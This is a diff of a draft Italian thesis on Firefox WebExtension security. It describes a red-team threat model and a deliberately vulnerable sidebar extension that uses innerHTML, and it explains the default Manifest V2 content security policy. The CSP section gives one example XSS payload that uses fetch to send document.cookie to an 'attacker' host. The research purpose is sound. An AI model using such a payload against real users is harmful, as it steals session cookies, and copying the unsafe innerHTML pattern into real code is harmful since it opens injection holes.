@@ -29,8 +29,10 @@
 \newcommand{\Nota}[1]{\MComment{Nota:}{#1}{olive}}
 \newcommand{\Assert}[1]{\MComment{Assert:}{#1}{red}}
 
+    % Formattazione
 \newcommand{\bold}[1]{\textbf{#1}}
 \newcommand{\code}[1]{\texttt{#1}}
+\newcommand{\file}[1]{\code{#1}}
 \newcommand{\method}[1]{\code{.#1()}}
 \newcommand{\property}[1]{\code{.#1}}
 \newcommand{\attr}[1]{\code{.#1}}
@@ -44,6 +46,8 @@
 \newcommand{\vuln}{\textit{"vuln"}}
 \newcommand{\www}{World Wide Web }
 \newcommand{\JS}{Javascript }
+\newcommand{\JSON}{JSON }
+\newcommand{\json}{JSON }
     % Estensioni
 \newcommand{\manifest}{\code{manifest.json} }
     % Browser
@@ -342,101 +346,101 @@
         esecuzione e offre funzioni di messaging, \todo{continua}
     
 
-
 \chapter{Scenario e ambiente sperimentale}
-    \section{Threat model}
-        \begin{itemize}
-            \item \textbf{Attaccante} Un membro del red-team interessato a compromettere
-                il web browser (Firefox) della vittima come parte di una catena di attacco.
-                Il suo obbiettivo è ottenere esecuzione di codice Javascript arbitrario che abbia
-                accesso agli API interni di Firefox.
-                Esso non ha altro modo di interagire con il sistema attaccato se non tramite
-                una applicazione web di cui controlla quantomeno il codice dell'interfaccia utente;
-                tale applicazione è visitabile attraverso un dominio pubblico ed espone endpoint
-                http e/o https.
-
-            \item \textbf{Vittima} Un utente privo di competenze in ambito cybersecurity.
-                Esso è stato persuaso ad utilizzare la propria installazione di Firefox
-                per visitare il dominio malevolo controllato dall'attaccante.
-        \end{itemize}
+    Il capitolo descrive i presupposti che hanno guidato la sperimentazione e l'ambiente
+    informatico in cui si è svolta. La \Sezione{specifiche-e-piattaforma} è una rapida descrizione
+    del sistema informatico usato durante il corso delle ricerche e dell'installazione
+    Firefox utilizzata mentre la \Sezione{threat-scenario} illustra il modello di minaccia
+    considerato. Infine la \Sezione{estensione-vuln} introduce all'estensione fantoccio 
+    bersagliata dagli attacchi, verrà approfondita nel \Capitolo{attaccando-vuln}.
 
     \section{Specifiche applicazione e piattaforma}
+    \label{specifiche-e-piattaforma}
         Per la mia ricerca ho svolto i test utilizzando l'ultima versione corrente di
         Mozilla Firefox v122.0 installata su MacOS Monterey v12.5 con processore Apple M1.
         Il codice sorgente studiato è stato scaricato dalla repository github ufficiale di mozilla,
         commit b59eed0; ogni menzione contenuta in questo articolo è relativa allo stato del codice
-        risalente al suddetto commit. link: \url{https://github.com/JackieSpring/firefox/tree/b59eed054bcd27fbdf7e796ee5993dfb69d47f55}. 
-        L'applicazione è stata compilata seguendo le istruzioni riportate sul sito
-        ufficiale di mozilla, link: \url{https://firefox-source-docs.mozilla.org/setup/macos_build.html}.
+        risalente al suddetto commit \cite{mozilla-gecko-dev}. 
+        L'applicazione è stata compilata seguendo le istruzioni riportate sul sito ufficiale di mozilla \cite{mozilla-build-firefox}.
 
-        L'installazione di Firefox utilizzata dalla vittima è l'ultima versione corrente
-        del browser ( attualmente Firefox 122.0 ). La vittima ha installato una estensione,
-        vulnerabile ad attacchi di code injection, che chiameremo "\textit{vuln}".
+    \section{Scenario}
+    \label{threat-scenario}
+        Per indirizzare la mia ricerca ho deciso di lavorare entro i limiti di uno scenario
+        che potesse modellizzare una situazione d'attacco reale in modo quantopiù generale e vero-simile.
+        Ho definito due attori interessati nella scena, un attaccante e una vittima, e due sistemi
+        informatici coinvolti appartenenti a l'uno e l'altro attore.
+        L'attaccante è interessato a compromettere il sistema informatico della vittima come parte di 
+        una catena di attacco. Il suo obbiettivo è ottenere esecuzione di codice Javascript arbitrario
+        al difuori della sandbox in cui il browser Firefox costringe gli script provenienti dal web.
+        L'attaccante controlla le risorse di una applicazione web raggiungibile dall'esterno tramite 
+        protocollo http/s; che egli abbia o meno controllo sul sistema informatico ospitante l'applicazione
+        è indifferente ai fini della ricerca.
+        La vittima è un utente privo di competenze in ambito cybersicurezza, è stata persuasa ad utilizzare
+        la propria installazione del browser Firefox per navigare sul sull'URL malevolo controllato
+        dall'attaccante.
+        Il sistema informatico della vittima ospita una istanza del browser Firefox sulla
+        quale è stata installata una estensione vulnerabile che è stata rappresentata nel mio ambiente
+        di ricerca dall'estensione \vuln di cui si parlerà nella \Sezione{estensione-vuln}.
+        L'attaccante non ha alcun modo di accedere o contattare direttamente il sistema informatico della vittima. 
 
 
     \section{L'estensione \vuln}
+    \label{estensione-vuln}
+        Ritenendo che la sola analisi statica del codice sorgente di Firefox non potesse essere
+        sufficiente ai fini del mio studio, ho deciso di simulare lo scenario descritto nella
+        \Sezione{threat-scenario} creando e installando nel browser una estensione che contenesse
+        un qualche errore logico sfruttabile da un potenziale attaccante per tentare di compromettere
+        il sistema informatico della vittima.
+        Basandomi sulla Top-Ten Owasp delle vulnerabilità nelle applicazioni web \cite{owasp-top-ten}, ho ritenuto
+        che l'introduzione di codice vulnerabile ad attacchi di html injection potesse considerarsi uno scenario
+        sufficientemente realistico ai fini della mia ricerca.
+        Un attacco di html injection consiste nel riuscire ad iniettare ed eseguire codice html nella pagina web
+        visualizzata dal browser della vittima; se oltre ad html l'attaccante dovesse riuscisse ad eseguire anche 
+        codice \JS allora sarebbe capace di performare attacchi di Cross-Site Scripting aprendo alla possibilità
+        di una ancora più profonda compromissione del sistema. Normalmente questo genere di attacchi viene
+        attuato sul codice front-end di una applicazione web per abusare delle funzionalità dell'applicazione
+        a scapito dell'utente oppure come trampolino verso altre applicazioni ( si pensi agli
+        attacchi di Cross-Site Request Forgery in cui la pagina vulnerabile viene sfruttata per
+        inviare richieste verso una seconda applicazione).\\
+        Ogni contensto \JS ha associato un oggetto \code{document}, tra Content Script, Background Script, sidebar,
+        popup e pagina opzioni, ogni estensione ha potenzialmente almeno cinque finestre su cui tentare
+        html injection, ho scelto di inserire la vulnerabilità nella finestra della sidebar, le ragioni di
+        questa scelta sono tre:
+        \begin{enumerate}
+            \item Il contesto d'esecuzione \JS della sidebar è lo stesso degli script di background, esso espone
+                    API che consentono di interagire con vari servizi del browser il che rende la sidebar un
+                    bersaglio di alto valore.
 
-        Il manifesto dell'estensione \vuln dichiara tre componenti:
-        \begin{itemize}
-            \item Un \textbf{Content script} incaricato di ottenere coppie chiave-valore
-                e inviarle in background. La coppia viene cercata all'interno della pagina
-                e puo anche essere ricevuta attraverso un evento custom "trigger", in
-                entrambi i casi la protezione Xray deve essere attenuata esponendo l'estensione.
+            \item Mentre la finestra dei content script è la stessa della pagina in cui stanno venendo eseguiti,
+                    invece la sidebar possiede una finestra a sé stante, visualizzabile in qualunque momento e 
+                    persistente nella facciata del browser rendendola facile da monitorare.
 
-            \item Un \textbf{Background script} memorizza la coppie ricevuta dal content script 
-                in un archivio salvato nel local storage del browser, implementato
-                come array di oggetti.
+            \item È un punto che potrebbe verosimilmente contenere codice vulnerabile e raggiungibile dall'attaccante.
+                    Trattandosi di una finestra è lecito supporre che venga utilizzata per visualizzare dati raccolti 
+                    dall'estensione, dati che devono essere inseriti nel documento html visualizzato.
+                    Come gia detto, la finestra può essere aperta solo dall'utente e non
+                    è in grado di effettuare richieste verso risorse esterne. In uno scenario verosimile l'ipotetico programmatore
+                    di \vuln si sarebbe sentito protetto da queste restrizioni e avrebbe incautamente implementato
+                    la logica della UI in modo approssimativo, ignorando i warning dei tool di
+                    sviluppo e introducendo codice vulnerabile nel programma.
+        \end{enumerate}
 
-            \item Una \textbf{Sidebar} che visualizza i dati delle coppie nella propria finestra
-                inserendoli come testo html.
-        \end{itemize}
+        La figura \ref{fig:sidebar-screenshot} mostra la sidebar di \vuln aperta sulla sinistra della pagina
+        web controllata dall'attaccante, il riquadro scuro in basso mostra invece il codice html del documento.
+        La sidebar sta visualizzando dieci coppie chiave-valore che l'estensione ha estrapolato dal codice
+        del sito malevolo, nel \Capitolo{attaccando-vuln} si approfondirà in che modo l'attaccante sfrutta i
+        valori di queste coppie per iniettare codice html.
 
-        I primi due compongono la logica dell'estensione mentre la sidebar funge da front-end ma
-        non è l'unica componente visualizzabile, insieme ad essa il manifest permette
-        di esporre altre finestre UI che sono i popup e la pagina delle opzioni personalizzata; per
-        restringere il campo di studio ho deciso di usare solo una delle tre finestre front-end,
-        ho ritenuto la sidebar il giusto candidato per le proprietà del componente:
-        \begin{itemize}
-            \item Il compartimento Javascript in cui viene eseguito il codice della sidebar
-                ha gli stessi permessi di accesso al WebExtensionAPI dello script di background
-                soddisfacendo gli obbiettivi di bersaglio del threat model.
-            
-            \item Il compartimento della finestra viene creato all'apertura della sidebar e rimane
-                attivo fino alla chiusura della stessa garantendomi controllo sulla durata
-                del suo ciclo di vita; inoltre la sidebar rimane visibile accanto ad ogni tab aperta
-                favorendone il debugging;
-                
-        \end{itemize}
-
-        \subsection{La vulnerabilità}
-            La vulnerabilità risiede nella logica della sidebar, nella funzione \code{updateArchiveView}
-
-            \begin{lstlisting}[caption={Frammento di codice vulnerabile nella sidebar di \vuln}]
-                keyField.innerHTML = data.key + ": ";
-                valField.innerHTML = data.value;
-        
-                container.appendChild( keyField );
-                container.appendChild(valField);
-            \end{lstlisting}
-            \label{code:vuln_archive_view}
-
-            quando gli elementi \code{keyField} e \code{valField} vengono aggiunti all'albero di nodi
-            del DOM, il campo \code{.innerHTML} viene valutato come valido codice HTML5 e interpretato,
-            se "key" o "value" dovessero contenere tag html essi verranno inseriti nel documento come
-            elementi validi (l'unica eccezione è il tag \code{<script>}, questo caso verrà approfondito
-            in seguito).
-
-        \section{Workflow dell'estensione}
-            \Nota{Questa sezione andrebbe spostata nel capitolo di spiegazione dell'attacco}
-            Il content script ottiene dal WebContent un oggetto contenente le proprietà "key" e "value",
-            poiché l'oggetto proviene da un compartimento con privilegi minori il content script attenua
-            la protezione sull'oggetto per poter leggere le proprietà non native, i dati vengono estratti,
-            accorpati ad un messaggio, serializzati e trasmessi sul sistema di messaggi del runtime;
-            durante questo passaggio vengono perse proprietà e valori non serializzabili, come le funzioni.
-            Alla ricezione di un messaggio lo script in background deserializza l'archivio
-
+        \begin{figure}[ht]
+            \centering                                                  
+            \includegraphics[width=0.5\textwidth]{sidebar-screenshot.png}
+            \caption{Visualizzazione della sidebar di \vuln accanto al sito malevolo}
+            \label{fig:sidebar-screenshot}                             
+        \end{figure}
+    
 
 \chapter{L'infrastruttura di sicurezza Firefox}
+\label{cap:infrastruttura-sicurezza-firefox}
     Ogni sito internet moderno ha in qualche modo il bisogno di interagire con la rete,
     con uno storage locale, con il file system e con dispositivi audio e video, tutte
     risorse gestite dal sistema operativo, pertanto ogni sito deve poter interagire con
@@ -573,6 +577,7 @@
             \end{itemize}
 
         \subsection{Entità di Sicurezza}
+        \label{sec:security-principal}
             Un Entità di Sicurezza è qualunque entità che puo essere autenticata da un sistema, in Gecko
             esistono quattro entità sulle quali è definita una relazione di sicurezza.
             Per determinare il rapporto tra due entità si verifica se ciascuna sussume l'altra.
@@ -633,16 +638,28 @@
 
 
 \chapter{WebExtension nel dettaglio}
-    \Nota{Approfondire il ruolo di \WebExtensionPolicy nelle chiamate IPC}\\
-    \Nota{Approfondire il ruolo di \ContentSecurityPolicy nelle chiamate agli API }\\
-    Quanto segue descrive la logica e le strutture che implementano il sistema delle WebExtensions a runtime,
-    dal termine dell'installazione all'iniezione del codice nel processo. Sono operazioni svolte in due ambienti,
-    nativo e javascript, ed interessano più componenti di Gecko, il mio studio si è concentrato sulla
-    rappresentazione in ambiente javascript delle estensioni attive in un processo tralasciando i dettagli
-    di archiviazione dei dati o di allocazione dei compartimenti.
-    \Assert{Continua, spiega che JS è malleabile e che puoi fare prototypepollution e che il codice è troppo grande per C++}
+\label{cap:webextension-dettaglio}
+    Il codice del WebExtension framework può essere trovato nella cartella \file{toolkit/components/extensions/}, è composto
+    da molti file che suddividerò in tre categorie: core, integrativi ed implementativi.\\
+    I file di \bold{core} definiscono logica e strutture in ambiente nativo che verranno indirettamente utilizzate da
+    tutti gli altri file, eseguono a livello di processo e svolgono ruoli di gestione della comunicazione tra
+    processi e avviamento degli altri script.\\
+    I file detti \bold{integrativi} definiscono la logica del framework, sono perlopiù moduli \JS
+    e lavorano a stretto contatto con i servizi e le utilities fornite da Gecko, come contesti di esecuzione \JS, sandbox, storage
+    e cache. Il loro compito è di gestire i dati delle estensioni nel Content Process ospite e sincronizzare le strutture
+    di rappresentazione dell'estensione collocate sugli altri processi; per queste ragioni troviamo classi che
+    coordinano l'invio e la ricezione di chiamate a procedure remote, classi per il setup e l'avviamento
+    del contesto \JS in cui verrà eseguita l'estensione, parsing dei manifesti e degli schemi implementativi
+    che descrivono gli api.\\
+    Infine gli script \bold{implementativi} definiscono gli oggetti che l'api espone, ovvero quelli ospitati
+    dall'oggetto \code{browser} menzionato nella \Sezione{webextension-api}. Curiosamente le definizioni di tali
+    oggetti non sono note al framework a tempo di compilazione, ma vengono introdotte a runtime dal framework stesso attraverso
+    schemi \json che contengono metadati sugli api e referenze ai rispettivi script \cite{webextension-api-development}, infatti i file cosiddetti implementativi
+    sono schemi \json (indicizzati da \file{ext-toolkit.json} e collocati nella sottocartella \file{schemas/}) e script \JS
+    che contengono il codice degli api esposti (residenti nelle sottocartelle \file{parent/} e \file{child/}).
+    In questo capitolo illustrerò nel dettaglio i processi di gestione delle estensioni a runtime. \todo{continua, illustra il capitolo}
 
-    \section{Breve introduzione a XPCOM}
+    \section{XPCOM}
         XPCOM Framework è un ambiente di sviluppo multi piattaforma che astrae elementi del sistema operativo,
         come la gestione della memoria, passing di messaggi e memoria condivisa, e fornisce interfacce di 
         comunicazione tra linguaggi programmazione; è il collante fondamentale tra i processi e le componenti di
@@ -660,6 +677,7 @@
         mentre il Child è l'entità corrispondente attiva su un altro processo, idelamente figlio del primo.
         Durante la compilazione, XPConnect genera sia le strutture di rappresentazione dei protocolli che le
         interfacce di programmazione per gli attori, implementate allo stesso modo delle interfacce \idl.
+
 
 
     \section{ Loading }
@@ -681,10 +699,93 @@
         scritto direttamente in Javascript.
          
     \section{}
-    \label{webextension-api-rpc}
-        Il codice del framework può essere trovato nella cartella \code{toolkit/components/extensions/}, è composto
-        da molti file che suddividerò in tre categorie: core, integrativi ed implementativi.
-        I file di core compongono 
+
+
+    \section{L'estensione a runtime}
+        //
+    
+    \section{L'api a runtime}
+    \label{sec:webextension-api-rpc}
+        \todo{Come viene creato l'ambiente di esecuzione dell'api?}
+        \todo{come viene invocata una funzione?}
+        \todo{come si ottiene il valore di ritorno?}
+
+
+\chapter{Attaccando vuln}
+\label{cap:attaccando-vuln}
+    In questo capitolo tratterò le difese applicate all'ambiente delle estensioni e 
+    indagherò i processi in atto dietro ai risultati dei miei tentativi d'attacco.
+
+    \section{Le difese delle estensioni}
+        Nel \Capitolo{cap:infrastruttura-sicurezza-firefox} ho discusso il sistema di sicurezza generale
+        degli script in Firefox, in questa sezione si mostreranno le difese specifiche dell'ambiente
+        WebExtension. Consci dei rischi dietro l'abuso del WebExtension API, gli sviluppatori mozilla
+        hanno cercato di ridurre al minimo le feature accessibili alle estensioni facendo una
+        distinzione netta fra gli script che interagiscono con il browser e gli script che interagiscono
+        con le pagine.
+
+        \subsection{I content script}
+        \label{sec:difese-content-script}
+            In Manifest V2 i content script non hanno Content Security Policy, mentre in Manifest V3 sono soggetti
+            alla CSP di default delle estensioni \refSection{sec:difese-background-sidebar}.
+            A differenza dei background script il loro codice è ospitato in ogni
+            \todo{in \refChapter{cap:infrastruttura-sicurezza-firefox} aggiungere sezione su Window context e browsing context }Window Context 
+            che veda la propria origine tra le origini specificate nella voce \code{"matches"} del \manifest dell'estensione.
+            La figura \ref{fig:vuln-manifest-contentscript} è un esempio di quanto detto,
+            la voce \code{"content\_scripts"} è una lista di configurazioni dei content script introdotti dall'estensione,
+            l'esempio dichiara un content script \file{content/csMain.js} che deve eseguirsi su tutte le
+            origini che rispettano le espressioni regolari della voce \code{"matches"}.
+
+            \begin{figure}[ht]
+                \centering
+                \includegraphics[width=0.85\textwidth]{vuln-manifest-content-script.png}
+                \caption{Sezione content\_scripts nel \manifest di \vuln}
+                \label{fig:vuln-manifest-contentscript}
+            \end{figure}
+
+            I content script possono accedere ad un insieme ristretto di WebExtension API, perlopiù event listener,
+            servizi di messaging, conversione dei locales e storage.
+
+        \subsection{I background script e la sidebar}
+        \label{sec:difese-background-sidebar}
+            Sugli script di background e le UI viene applicata una CSP di default modificabile soltanto dal
+            \manifest dell'estensione, i dettagli della policy differiscono tra Manifest V2 e V3. Nella
+            mia ricerca ho trattato solo la versione 2 del manifest pertanto tratterò solo le specifiche
+            di quest'ultima.
+            La CSP di background è piu severa rispetto ai content script volta a restringere le origini
+            da cui caricare codice \JS e pratiche di programmazione potenzialmente insicure, la specifica
+            standard del manifest V2 è:
+            \begin{lstlisting}
+                "script-src 'self'; object-src 'self';"
+            \end{lstlisting}
+            Nel pratico la riga precedente si traduce in quattro restrizioni:
+            \begin{itemize}
+                \item Risorse \code{<script>} e \code{<object>} possono essere caricate solo da origini
+                        locali all'estensione (ovvero file collocati nella stessa cartella). Tutte le
+                        richieste che cercheranno di includere codice nella pagina proveniente da origini
+                        considerate insicure verranno bloccate silenziosamente.
+
+                \item Non è concesso evaluare stringhe come codice \JS. L'uso di funzioni come
+                        \code{eval()}, \code{setTimeout()}, \code{setInterval()} e \code{Function()}
+                        per eseguire il contenuto di stringhe come codice \JS viene bloccato silenziosamente.
+                
+                \item Non è consentito eseguire codice \JS inline. Con codice inline si intende codice
+                        \JS hard-coded in elementi html, come quello contenuto nel tag \code{<script>}
+                        quando non viene utilizzato per includere file script. Un esempio è l'abuso degli
+                        event listener dichiarabili direttamente sui tag html per eseguire \JS malevolo:\\
+                        \code{<img src="invalid" onerror=fetch("http://attacker/?" + document.cookie) >}        
+
+                \item \todo{due parole su webassembly} Non è consentito eseguire codice WebAssembly.
+            
+            \end{itemize}
+            Questa politica è applicata su ogni estensione che non abbia esplicitamente modificato la voce
+            \code{"content\_security\_policy"} del suo \manifest e non è modificabile programmaticamente.
+            
+        \todo{forse questa sezione dovrebbe stare in \refChapter{cap:webextension-dettaglio} }\subsection{API}
+        \label{sec:difese-api-sandbox}
+            L'implementazione del WebExtension API è collocata nel Parent Process all'interno
+            di una Sandbox che esegue come Entità di Sistema \refSection{sec:security-principal} ed ha
+            accesso a molti servizi del browser (vedi \file{ExtensionCommon.sys.mjs} \method{\_createExtGlobal}).
 
 
 \chapter{Conclusioni}
